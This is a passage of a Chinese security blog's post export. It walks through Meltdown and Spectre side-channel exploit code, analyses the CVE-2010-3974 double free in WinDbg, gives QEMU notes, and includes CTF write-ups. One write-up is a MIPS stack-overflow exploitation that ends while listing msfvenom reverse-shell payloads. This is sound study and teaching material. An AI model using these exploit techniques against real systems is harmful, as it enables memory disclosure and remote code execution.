movzx rbx, byte ptr [rdx+rax] 步骤3这时候我们再尝试测试读取target+ i * 4096，一旦发现这个读取时间小于阀值（threshold），那么就证明这时候的i就是之前读取出来的al的值了，即从侧面知道了之前读取的值了 作者代码如下： 1234567891011121314151617static int cache_hit_threshold;static int hist[VARIANTS_READ];void check(void)&#123; int i, time, mix_i; volatile char *addr; for (i = 0; i &lt; VARIANTS_READ; i++) &#123; mix_i = ((i * 167) + 13) &amp; 255; addr = &amp;target_array[mix_i * TARGET_SIZE]; time = get_access_time(addr); if (time &lt;= cache_hit_threshold) hist[mix_i]++; &#125;&#125; 我改成直接读取&amp;target_array[i * TARGET_SIZE];也是可以的，修改如下 123456789101112131415void check(void)&#123; int i, time, mix_i; volatile char *addr; for (i = 0; i &lt; VARIANTS_READ; i++) &#123; //mix_i = ((i * 167) + 13) &amp; 255; mix_i = i; addr = &amp;target_array[mix_i * TARGET_SIZE]; time = get_access_time(addr); if (time &lt;= cache_hit_threshold) hist[mix_i]++; &#125;&#125; 其中mix_i就是真正泄露出来的值，而hist[mix_i]是所谓的分数，即这个值命中了几次，因为推测执行和乱序执行不一定每次都能执行到那里了，所以对于读取每一个byte，都循环执行了1000次，当然每次执行前都要将target_arrayflush掉 12for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;target_array[i * 4096]); 所以要提高泄露数据的成功率，可以增加读取每个byte时候的循环次数 下面可以看到1000次成功0到5次 referenceshttps://weibo.com/ttarticle/p/show?id=2309404192925885035405https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c","categories":[],"tags":[{"name":"cpu漏洞","slug":"cpu漏洞","permalink":"https://www.giantbranch.cn/tags/cpu漏洞/"}]},{"title":"腾讯玄武实验室检测浏览器spectre的原理","slug":"腾讯玄武实验室检测浏览器spectre的原理","date":"2018-01-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/","link":"","permalink":"https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/","excerpt":"","text":"检测地址（也是分析的来源）：http://xlab.tencent.com/special/spectre/spectre_check.html 首先判断是否启用了window.SharedArrayBuffer，如果没有启用的话就直接输出不容易受到攻击 1234567891011121314151617function main()&#123; output_testing_start(); // 如果不支持window.SharedArrayBuffer直接就输出不受漏洞影响了 // 有了 SharedArrayBuffer 后，多个 web worker 就可以同时读写同一块内存了 // 这种同时访问也有风险，会产生竞争条件 if(window.SharedArrayBuffer) &#123; console.log(&quot;cache : 8&quot;); output_cache_log(8); check(8, [88,117,97,110,119,117]); &#125; else &#123; output_not_info_leak(); &#125;&#125; 假如是chrome可以在地址栏输入下面的进行开启和关闭（google为了防止利用直接云端控制将这个flag默认关闭了——来自tk微博评论） chrome://flags/#shared-array-buffer 关闭状态 开启状态 开启后即可检测出存在风险，并在16M缓存的时候可以成功泄露 第一步新建一个Worker 1const worker = new Worker(&apos;/special/spectre/js/worker.js&apos;); 其中worker代码如下： 12345678self.addEventListener(&apos;message&apos;, function (event)&#123; const sharedBuffer = event.data; const sharedArray = new Uint32Array(sharedBuffer); postMessage(&apos;start&apos;); while(true) Atomics.add(sharedArray,0,1); //使用 Atomics.add，加法执行过程中不会因为多线程而被打乱。&#125;); 其中message事件是处理postMessage的 Atomics.add方法原型Atomics.add(typedArray, index, value)更多请看https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Atomics/add 第二步新建了一个SharedArrayBuffer，并作为普通Array的参数new了一下，之后postMessage触发Worker 123const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);const sharedArray = new Uint32Array(sharedBuffer);worker.postMessage(sharedBuffer); 接下来是new了一个 num * 1024 * 1024的evictionBuffer（num一开始是8，失败后就将num*2再尝试利用，最多是256，即256M的缓存测试），利用这个buffer再new一个DataView，之后flush掉evictionView 123456var offset = 64;var current;var cache_size = num * 1024 * 1024;var evictionBuffer = new ArrayBuffer(cache_size);var evictionView = new DataView(evictionBuffer);clflush(cache_size); 之后初始化asmModule这个类（其中probeTable是0x3000000大小），并调用init方法 var asm = asmModule(this,{},probeTable.buffer)asm.init(); init是初始化simpleByteArray 123456789101112function init() &#123; var i =0; var j =0; for(i=0; (i|0)&lt;16; i=(i+1)|0 ) simpleByteArray[i|0] = ((i|0)+1)|0; for(i=0; (i|0)&lt;30; i=(i+1)|0 ) &#123; j = ((((i|0)*8192)|0) + 0x1000000)|0 simpleByteArray[(j|0)] = 0x10; &#125; &#125; 这是初始化后的结果 设置simpleByteArray偏移0x2200000+i的值分别为88,117,97,110,119,117（即Xuanwu的ascii码）这是为了模拟在内存中存储的密码等信息 123var simpleByteArray = new Uint8Array(probeTable.buffer);for(var i=0;i&lt;data_array.length;i++) simpleByteArray[0x2200000 + i] = data_array[i]; 第三步最后通过侧信道的攻击方式“读取”0x2200000+i那边的内存，跟我们之前写进去的比较，如果“读”出来的是正确的，那说明我们可以成功泄露了 123456789101112131415161718192021222324252627for(var i=0;i&lt;data_array.length;i++) &#123; var data = readMemoryByteWrapper(0x2200000+i); if (data != data_array[i]) &#123; worker.terminate(); if((num*2) &lt; 256) &#123; console.log(); console.log(&quot;cache : &quot;+ num*2); output_cache_log(num*2); check(num*2, data_array); &#125; else &#123; output_not_info_leak(); &#125; return; &#125; else &#123; var infor_string = &quot;\\&quot;&quot;+String.fromCharCode(data)+&quot;\\&quot; : &quot;+ data; console.log(infor_string); is_reset = true; &#125; &#125; 我们具体看看readMemoryByteWrapper，实际这个函数是调用readMemoryByte进行“读取”，假如读取不成功便尝试继续读取 readMemoryByte我们重点看下readMemoryByte函数，关键是这两个循环 123456789101112131415161718for (var j = 29; j &gt;= 0; j--)&#123; for ( var z = 0; z &lt; 100; z++) &#123;&#125; var x = ((j % 6) - 1) &amp; ~0xFFFF; x = (x | (x &gt;&gt; 16)); x = training_x ^ (x &amp; (malicious_x ^ training_x)); asm.vul_call(x,j);&#125;for (var i = 0; i &lt; 256; i++)&#123; var mix_i = i; var timeS = start(); junk = probeTable[(mix_i * TABLE1_STRIDE)]; timeE = now(); if (timeE-timeS &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != simpleByteArray[tries % simpleByteArrayLength]) results[mix_i]++;&#125; 对于第一个循环我们关注asm.vul_call(x,j); 12345678910111213141516function vul_call(index, sIndex)&#123; index = index |0; sIndex = sIndex |0; var arr_size = 0; var j = 0; junk = probeTable[0]|0; j = ((((sIndex|0)*8192)|0) + 0x1000000)|0; arr_size = simpleByteArray[(j|0)]|0; if ((index|0) &lt; (arr_size|0)) &#123; index = simpleByteArray[index|0]|0; index = ((index * 0x1000)|0); index = (index &amp; ((0x2000000-1)|0))|0; junk = (junk ^ (probeTable[index]|0))|0; &#125;&#125; 这个其实跟meldown的利用方式是相似的，简化一下代码 1234567891011121314function vul_call(index, sIndex)&#123; var arr_size = 0; var j = 0; junk = probeTable[0]; j = ((((sIndex)*8192)) + 0x1000000); arr_size = simpleByteArray[(j)]; if ((index) &lt; (arr_size)) &#123; index = simpleByteArray[index]; index = ((index * 0x1000)); index = (index &amp; ((0x2000000-1))); junk = (junk ^ (probeTable[index])); &#125;&#125; 首先读取simpleByteArray里面的值，作为index（索引） 123index = simpleByteArray[index];index = ((index * 0x1000));index = (index &amp; ((0x2000000-1))); 之后将probeTable利用这个索引跟junk异或，这样probeTable[index]就被缓存下来了 1junk = (junk ^ (probeTable[index])); 接下来看第二个循环，其中TABLE1_STRIDE为0x1000，跟上面是遥相呼应 123456789for (var i = 0; i &lt; 256; i++)&#123; var mix_i = i; var timeS = start(); junk = probeTable[(mix_i * TABLE1_STRIDE)]; timeE = now(); if (timeE-timeS &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != simpleByteArray[tries % simpleByteArrayLength]) results[mix_i]++;&#125; 一旦读取出来probeTable[(mix_i * TABLE1_STRIDE)];的值的时间小于CACHE_HIT_THRESHOLD（就是可以去区分从cached和uncached读取时间的阀值，大于它就是uncached的，否则是cached） 一旦是cached的，说明当前的mix_i就是侧信道泄露出来的值，即Array中的这些值[88,117,97,110,119,117] 而results[mix_i]++就是储存100次尝试中成功泄露该位的次数 防护建议禁用SharedArrayBuffer 既然都禁用这个了，那么含有这个利用的关键词就可以拦截了： SharedArrayBuffer referenceshttp://xlab.tencent.com/special/spectre/spectre_check.htmlhttps://segmentfault.com/a/1190000006061528","categories":[],"tags":[{"name":"cpu漏洞","slug":"cpu漏洞","permalink":"https://www.giantbranch.cn/tags/cpu漏洞/"},{"name":"spectre","slug":"spectre","permalink":"https://www.giantbranch.cn/tags/spectre/"}]},{"title":"CVE-2010-3974-Microsoft Windows 传真封面编辑器双重释放漏洞","slug":"CVE-2010-3974-Microsoft_Windows_传真封面编辑器双重释放漏洞","date":"2018-01-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/01/02/CVE-2010-3974-Microsoft_Windows_传真封面编辑器双重释放漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/01/02/CVE-2010-3974-Microsoft_Windows_传真封面编辑器双重释放漏洞/","excerpt":"","text":"环境 Windows 7 32位（原始镜像安装完就行）windbgida 漏洞分析打开软件：在命令行输入fxscover windbg附加，打开poc，点击确定 windbg断下 123456789100:005&gt; g(a30.b00): Unknown exception - code 000006ba (first chance)(a30.9a8): C++ EH exception - code e06d7363 (first chance)(a30.9a8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=01de1ad8 ebx=0032ebb0 ecx=01dd78d8 edx=01dd7ea0 esi=01dd78d8 edi=01db71f8eip=01dd7ea0 esp=0014f65c ebp=0014f660 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0001020601dd7ea0 b800de01d8 mov eax,0D801DE00h 堆栈调用显示如下： 1234567891011121314151617181920212223242526272829303132333435360:000&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.0014f658 68b2b7b3 0014f67c 005faadd 006164f4 0x1dd7ea00014f660 005faadd 006164f4 01db71f8 0032ebb0 MFC42u!CObject::IsKindOf+0xb (FPO: [Non-Fpo])0014f67c 005fb1d4 00000000 0032ebb0 68b38515 FXSCOVER!CDrawDoc::Remove+0x67 (FPO: [Non-Fpo])0014f688 68b38515 0032ebb0 68b384df 0032ebb0 FXSCOVER!CDrawDoc::DeleteContents+0xc (FPO: [0,0,4])0014f690 68b384df 0032ebb0 0032ebb0 0014f6d4 MFC42u!CDocument::OnNewDocument+0x15 (FPO: [0,0,4])0014f6a0 005fa812 0032ebb0 68b383e8 e409f953 MFC42u!COleDocument::OnNewDocument+0xe (FPO: [Non-Fpo])0014f6a8 68b383e8 e409f953 01db71f8 01db7274 FXSCOVER!CDrawDoc::OnNewDocument+0xa (FPO: [0,0,4])0014f6d4 68b38598 00000000 00000001 e409f8e3 MFC42u!CSingleDocTemplate::OpenDocumentFile+0x103 (FPO: [Non-Fpo])0014f764 005f80fb 0032ebb0 00616000 005f94f3 MFC42u!CDocManager::OnFileNew+0xaa (FPO: [Non-Fpo])0014f770 005f94f3 e409385d 00000000 00618798 FXSCOVER!CDrawApp::OnFileNew+0xb (FPO: [0,0,0])0014f7b8 005f8f62 01dd3410 e4093801 00000000 FXSCOVER!CDrawApp::OpenDocumentFile+0x57a (FPO: [Non-Fpo])0014f7e4 68b46572 00000000 005f1de0 0014f828 FXSCOVER!CDrawApp::OnFileOpen+0x4a (FPO: [Non-Fpo])0014f7f4 68b2a879 00618798 0000e101 00000000 MFC42u!_AfxDispatchCmdMsg+0x49 (FPO: [Non-Fpo])0014f828 68b2b957 0000e101 00000000 00000000 MFC42u!CCmdTarget::OnCmdMsg+0x13c (FPO: [Non-Fpo])0014f864 68b2c42b 0000e101 00000000 00000000 MFC42u!CFrameWnd::OnCmdMsg+0xb6 (FPO: [Non-Fpo])0014f8b4 68b46d1d 0000e101 00000000 0032ed08 MFC42u!CWnd::OnCommand+0x99 (FPO: [Non-Fpo])0014f8d0 68b2c3b5 0000e101 00000000 e409f6df MFC42u!CFrameWnd::OnCommand+0x79 (FPO: [Non-Fpo])0014f958 68b26657 00000111 0000e101 00000000 MFC42u!CWnd::OnWndMsg+0x51 (FPO: [Non-Fpo])0014f980 68b2887a 00000111 0000e101 00000000 MFC42u!CWnd::WindowProc+0x2e (FPO: [Non-Fpo])0014f9e8 68b287d2 0032ed08 00000000 00000111 MFC42u!AfxCallWndProc+0xb5 (FPO: [Non-Fpo])0014fa0c 68b28909 000d0266 00000111 0000e101 MFC42u!AfxWndProc+0x3e (FPO: [Non-Fpo])0014fa40 766886ef 000d0266 00000111 0000e101 MFC42u!AfxWndProcBase+0x57 (FPO: [Non-Fpo])0014fa6c 76688876 68b288b2 000d0266 00000111 USER32!InternalCallWinProc+0x230014fae4 766889b5 00000000 68b288b2 000d0266 USER32!UserCallWinProcCheckWow+0x14b (FPO: [Non-Fpo])0014fb44 76688e9c 68b288b2 00000000 0014fb7c USER32!DispatchMessageWorker+0x35e (FPO: [Non-Fpo])0014fb54 68b2c48f 006187cc 00000000 00618798 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])0014fb64 68b2c4e9 00618798 00618798 ffffffff MFC42u!CWinThread::PumpMessage+0x42 (FPO: [0,0,0])0014fb7c 68b2f85d 00619298 00000001 00000000 MFC42u!CWinThread::Run+0x4e (FPO: [Non-Fpo])0014fb90 0060d63a 005f0000 00000000 00151b80 MFC42u!AfxWinMain+0x84 (FPO: [Non-Fpo])0014fc24 75ed1174 7ffd9000 0014fc70 775cb3f5 FXSCOVER!_initterm_e+0x1b1 (FPO: [Non-Fpo])0014fc30 775cb3f5 7ffd9000 83b468be 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])0014fc70 775cb3c8 0060d792 7ffd9000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])0014fc88 00000000 0060d792 7ffd9000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 其实上面可以看DeleteContents，Remove这个函数，应该是跟释放相关 触发异常的地址是已经free掉了的，那感觉是释放后重用，这个需要后面再确认 123450:000&gt; !heap -p -a 01de1ad8 address 01de1ad8 found in _HEAP @ 320000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01de1ad0 0075 0000 [00] 01de1ad8 003a0 - (free) 我的gflags没有开 120:000&gt; !gflagCurrent NtGlobalFlag contents: 0x00000000 下面开启页堆，hpa（其实使用hfc【heap free check】更精准一点） 10:005&gt; !gflag +hpa 重新打开poc触发下面异常 1234567890:005&gt; g(c58.d58): C++ EH exception - code e06d7363 (first chance)Critical error detected c0000374(c58.d58): Break instruction exception - code 80000003 (first chance)eax=00000000 ebx=00000000 ecx=775907ed edx=0016ed4d esi=00320000 edi=006d7a08eip=7763280d esp=0016efa0 ebp=0016f018 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206ntdll!RtlReportCriticalFailure+0x29:7763280d cc int 3 我们这时候再看下堆栈 123456789101112131415161718192021220:000&gt; kbChildEBP RetAddr Args to Child 0016f018 7763376b c0000374 7764cdc8 0016f05c ntdll!RtlReportCriticalFailure+0x290016f028 7763384b 00000002 83af535a 00320000 ntdll!RtlpReportHeapFailure+0x210016f05c 77633ab4 00000003 00320000 006d7a08 ntdll!RtlpLogHeapFailure+0xa10016f0b4 775f7ad7 00320000 006d7a08 00000000 ntdll!RtlpAnalyzeHeapFailure+0x25b0016f1a8 775c2d68 006d7a08 006d7a10 006d7a10 ntdll!RtlpFreeHeap+0xc60016f1c8 765298cd 00320000 00000000 006d7a10 ntdll!RtlFreeHeap+0x1420016f214 0086f43a 006d7a10 006d7a10 0016f240 msvcrt!free+0xcd0016f224 0086ab0c 00000001 006b71f8 0032ebb0 FXSCOVER!CDrawRoundRect::`scalar deleting destructor&apos;+0x1a0016f240 0086b1d4 00000000 0032ebb0 687d8515 FXSCOVER!CDrawDoc::Remove+0x960016f24c 687d8515 0032ebb0 687d84df 0032ebb0 FXSCOVER!CDrawDoc::DeleteContents+0xc0016f254 687d84df 0032ebb0 0032ebb0 0016f298 MFC42u!CDocument::OnNewDocument+0x150016f264 0086a812 0032ebb0 687d83e8 841d2315 MFC42u!COleDocument::OnNewDocument+0xe0016f26c 687d83e8 841d2315 006b71f8 006b7274 FXSCOVER!CDrawDoc::OnNewDocument+0xa0016f298 687d8598 00000000 00000001 841d22a5 MFC42u!CSingleDocTemplate::OpenDocumentFile+0x1030016f328 008680fb 0032ebb0 00886000 008694f3 MFC42u!CDocManager::OnFileNew+0xaa0016f334 008694f3 841d67a9 00000000 00888798 FXSCOVER!CDrawApp::OnFileNew+0xb0016f37c 00868f62 006d3410 841d677d 00000000 FXSCOVER!CDrawApp::OpenDocumentFile+0x57a0016f3a8 687e6572 00000000 00861de0 0016f3ec FXSCOVER!CDrawApp::OnFileOpen+0x4a............ 开启页堆后，我们可以看得更多， FXSCOVER!CDrawDoc::Remove之后调用析构函数，再调用msvcrt!free，再之后通过ntdll的函数真正去free 那我们尝试在msvcrt!free+0x33下断点，并输出要free的地址看看是不是double free 123456789100:009&gt; u msvcrt!free+0x33msvcrt!free+0xc7:765298c7 ff154c115276 call dword ptr [msvcrt!_imp__HeapFree (7652114c)]765298cd 85c0 test eax,eax765298cf 0f8478a90300 je msvcrt!free+0xd1 (7656424d)765298d5 e8a1ffffff call msvcrt!_SEH_epilog4 (7652987b)765298da c3 ret765298db 90 nop765298dc 90 nop765298dd 90 nop 断点如下： 1bp msvcrt!free+0x33 &quot;r esi;!heap -p -a esi;gc&quot; 跟着你就可以喝杯茶，回来看到最后一条记录 1234567891011121314esi=01e47a10 address 01e47a10 found in _HEAP @ 470000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01e478d0 0057 0000 [00] 01e478d8 002b0 - (free) Critical error detected c0000374(4c8.230): Break instruction exception - code 80000003 (first chance)eax=00000000 ebx=00000000 ecx=775907ed edx=0010f469 esi=00470000 edi=01e47a08eip=7763280d esp=0010f6bc ebp=0010f734 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202ntdll!RtlReportCriticalFailure+0x29:7763280d cc int 3 可以看到这时是去free一个已经free过了01e47a10，我们网上翻（其实是将记录复制下来ctrl+f），就可以看到下面这条记录 123456esi=01e47a10 address 01e47a10 found in _HEAP @ 470000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 01e47a08 0027 0000 [00] 01e47a10 0012c - (busy) FXSCOVER!CObject::`vftable&apos; 所以非常明显，这是一个double free 补丁对比其实这个很难调试去发现为什么会双重释放，补丁对比会发现为什么 因为是doc那个函数出的错，我们去看这个函数 增加了IsObjectAlreadySerialized的检测，如果已经序列化过了，说明已经free过了，以为序列化的时候会free","categories":[],"tags":[{"name":"double free","slug":"double-free","permalink":"https://www.giantbranch.cn/tags/double-free/"},{"name":"vulnerability","slug":"vulnerability","permalink":"https://www.giantbranch.cn/tags/vulnerability/"}]},{"title":"QEMU简单使用的笔记","slug":"QEMU简单使用的笔记","date":"2017-12-31T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2017/12/31/QEMU简单使用的笔记/","link":"","permalink":"https://www.giantbranch.cn/2017/12/31/QEMU简单使用的笔记/","excerpt":"","text":"安装1apt update &amp;&amp; apt install qemu 启动支持的架构真的多 12345678910111213qemu-aarch64 qemu-mips64 qemu-sh4eb qemu-system-mips qemu-system-sparc64qemu-alpha qemu-mips64el qemu-sparc qemu-system-mips64 qemu-system-tricoreqemu-arm qemu-mipsel qemu-sparc32plus qemu-system-mips64el qemu-system-unicore32qemu-armeb qemu-mipsn32 qemu-sparc64 qemu-system-mipsel qemu-system-x86_64qemu-cris qemu-mipsn32el qemu-system-aarch64 qemu-system-moxie qemu-system-xtensaqemu-i386 qemu-nbd qemu-system-alpha qemu-system-or32 qemu-system-xtensaebqemu-img qemu-or32 qemu-system-arm qemu-system-ppc qemu-tilegxqemu-io qemu-ppc qemu-system-cris qemu-system-ppc64 qemu-unicore32qemu-m68k qemu-ppc64 qemu-system-i386 qemu-system-ppc64le qemu-x86_64qemu-make-debian-root qemu-ppc64abi32 qemu-system-lm32 qemu-system-ppcemb qemu-microblaze qemu-ppc64le qemu-system-m68k qemu-system-sh4 qemu-microblazeel qemu-s390x qemu-system-microblaze qemu-system-sh4eb qemu-mips qemu-sh4 qemu-system-microblazeel qemu-system-sparc 很多时候已经有现成的镜像和内核了 比如debian就提供了比较多 https://people.debian.org/~aurel32/qemu/ 而且里面也给了启动方式，至于内核，32还是64什么的就自己选了 1234- qemu-system-arm -M versatilepb -kernel vmlinuz-2.6.32-5-versatile -initrd initrd.img-2.6.32-5-versatile -hda debian_squeeze_armel_standard.qcow2 -append &quot;root=/dev/sda1&quot;- qemu-system-arm -M versatilepb -kernel vmlinuz-2.6.32-5-versatile -initrd initrd.img-2.6.32-5-versatile -hda debian_squeeze_armel_desktop.qcow2 -append &quot;root=/dev/sda1&quot;- qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append &quot;root=/dev/sda1&quot;- qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_desktop.qcow2 -append &quot;root=/dev/sda1&quot; 当然这里还有一些装好gdb和gef的镜像 https://blahcat.github.io/2017/06/25/qemu-images-to-play-with/ 还要说的就是端口的映射，可以在上面指令的基础上加上下面这个 1-redir tcp:22::22 不要图像界面可以下面这样，直接给完整示例吧 1qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -redir tcp:22::22 -redir tcp:10000::10000 -redir tcp:10001::10001 -redir tcp:10002::10002 -redir tcp:1616::1616 -nographic 退出当前虚拟机ctrl + A 再按 X","categories":[],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://www.giantbranch.cn/tags/虚拟化/"}]},{"title":"3DSCTF RE Scared Flag","slug":"3DSCTF RE Scared Flag","date":"2017-12-31T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/31/3DSCTF RE Scared Flag/","link":"","permalink":"https://www.giantbranch.cn/2017/12/31/3DSCTF RE Scared Flag/","excerpt":"","text":"一开始给了个hex文件，那就用hex2bin将其转化为bin。 直接strings有些东西，但并不是真正的flag 12345678910strings ea137e7356e566945e51bbece00a22ad.bin #+$+%+af&apos;w&apos;33 44 53 7B 62 79 20 4A 75 6C 69 6F 20 44 65 6C 6C 61 20 46 6C 6F 72 61 7D33 44 53 7B 52 45 41 4C 4C 59 20 4D 52 2E 20 46 55 5A 5A 45 52 3F 20 49 73 20 74 68 61 74 20 61 6C 6C 20 79 6F 75 27 76 65 20 67 6F 74 3F 7Dif you can scare me...I&apos;ll run away and leave the flag for younot even closeI&apos;m not scared yetpretty scary, I left the flag here, you can catch 后来用ida打开，完全看不出来，因为ida以为是二进制文件 后来用radare2，其实是一个avr的文件 12345678910111213141516171819202122232425262728293031[0x000000c4]&gt; i -hblksz 0x0block 0x100fd 3file ./ea137e7356e566945e51bbece00a22ad.binformat avriorw falsemode -r-xsize 0xbc6humansz 2.9Ktype ROMarch avrbinsz 3014bits 8canary falsecrypto falseendian littlehavecode truelinenum falselsyms falsemachine ATmelmaxopsz 4minopsz 2nx falseos avrpcalign 2pic falserelocs falsestatic truestripped falseva false 直接切换视图，拖到下面一点就可以看到了 3DS{youareabully}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"reverse","slug":"reverse","permalink":"https://www.giantbranch.cn/tags/reverse/"}]},{"title":"ida mipsrop 简单使用","slug":"IDA mipsrop 简单使用","date":"2017-12-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/12/29/IDA mipsrop 简单使用/","link":"","permalink":"https://www.giantbranch.cn/2017/12/29/IDA mipsrop 简单使用/","excerpt":"","text":"下载地址，完了放到ida的plugins目录就行 https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py 打开你的mips程序，点击search——&gt;mips rop gadgets 之后在下面输入框输入 1mipsrop.find(&quot;&quot;) 这样就显示所有gadgets，如果具体查找在输入具体的吧 1mipsrop.find(&quot;jr&quot;)","categories":[],"tags":[{"name":"ida plugins","slug":"ida-plugins","permalink":"https://www.giantbranch.cn/tags/ida-plugins/"},{"name":"rop","slug":"rop","permalink":"https://www.giantbranch.cn/tags/rop/"},{"name":"mips","slug":"mips","permalink":"https://www.giantbranch.cn/tags/mips/"}]},{"title":"MIPS PWN 实例 —— UCTF 2016 ADD","slug":"MIPS PWN 实例 —— UCTF 2016 ADD","date":"2017-12-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/12/29/MIPS PWN 实例 —— UCTF 2016 ADD/","link":"","permalink":"https://www.giantbranch.cn/2017/12/29/MIPS PWN 实例 —— UCTF 2016 ADD/","excerpt":"","text":"题目: https://dn.jarvisoj.com/challengefiles/add.1f54e2c8b9396f83a4be2632bcb3a5f5 这是2016全国大学生信息安全竞赛的一个题，是MIPSEL（小端的） qemu虚拟机可以在这里下 https://people.debian.org/~aurel32/qemu/mipsel/ 启动： 1qemu-system-mips64el -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -redir tcp:22::22 -redir tcp:11000::11000 -redir tcp:11001::11001 -redir tcp:11002::11002 -redir tcp:1717::1717 -nographic 环境： apt-get updateapt-get install build-essential gdb socat 或者使用配置好的qemu虚拟机 https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA 先查看保护措施 123root@debian-mipsel:~/ctf/uctf# checksec --file add RELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILENo RELRO No canary found NX enabled No PIE No RPATH No RUNPATH Error: libc not found. 这个MIPS实际上是硬件上不支持NX的，所以这里开了也没有用所以可以直接执行shellcode 这个代码一开始还是比较难看的，但是misp应该不会太难 下面这个的输入没有长度限制，应该存在缓冲区溢出 生成200个字节 123pattern create 200[+] Generating a pattern of 200 bytesaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 因为要退出才会回到返回地址所以要退出 12345678910Starting program: /root/ctf/uctf/add [calc]Type &apos;help&apos; for help.aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 1Error!Input 2 numbers just like:1 20 + 1 = 1exitExiting... 之后便可以看到$ra(这个是储存返回地址的) 1$ra : 0x62616164 (&quot;daab&quot;?) 看下偏移，这个我们是112，因为是小端 1234 pattern offset 0x62616164[+] Searching &apos;0x62616164&apos;[+] Found at offset 112 (little-endian search) likely[+] Found at offset 304 (big-endian search) 大小端这个通过看内存就可以判断了 1x /8bx 0xxxxxxxx 还有一个问题就是要么我们能得到栈上的地址，要么找类似于x86是的jmp esp 但是用IDA的mipsrop插件找不到，没栈地址还是用不了 12345678910111213Python&gt;mipsrop.find(&quot;&quot;)----------------------------------------------------------------------------------------------------------------| Address | Action | Control Jump |----------------------------------------------------------------------------------------------------------------| 0x00400658 | lw $ra,arg_1C($sp) | jr arg_1C($sp) || 0x00400758 | lw $ra,0x30+var_4($sp) | jr 0x30+var_4($sp) || 0x00400834 | lw $ra,0x30+var_4($sp) | jr 0x30+var_4($sp) || 0x00400ADC | lw $ra,0x98+var_4($sp) | jr 0x98+var_4($sp) || 0x00400C54 | lw $ra,0x38+var_4($sp) | jr 0x38+var_4($sp) || 0x00400CC4 | lw $ra,0x28+var_4($sp) | jr 0x28+var_4($sp) || 0x00400DDC | lw $ra,0x1C($sp) | jr arg_1C($sp) |----------------------------------------------------------------------------------------------------------------Found 7 matching gadgets 所以应该还有其他东西，这个我们没看到输出，根据汇编是跟$4比较相等才来printf这里 我们上去看看$4,而$4刚好是sprintf的第一个参数，即对rand返回值格式化的结果 而且srand的种子固定，那就可预测，我们编写程序 123456789#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;int main(int argc, char const *argv[])&#123; srand(0x123456); printf(&quot;%d\\n&quot;, rand()); return 0;&#125; 编译运行 123# gcc -o rand ./rand.c# ./rand 2057561479 我们看看是不是 在内存确定这个是不是我们栈上buf的基址 12x /s 0x7fffeb1c0x7fffeb1c: &quot;2057561479&quot; 果然，那么有了偏移，有了栈地址，就可以写代码了 shellcode的生成就用msf，有个坑就是msf这里把mipsel叫mipsle（其实我觉得le好记点，little ending嘛） 可以先看看有什么payload 12345678910➜ ~ msfvenom -l payloads | grep \"mipsle\" linux/mipsle/exec A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space. linux/mipsle/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to 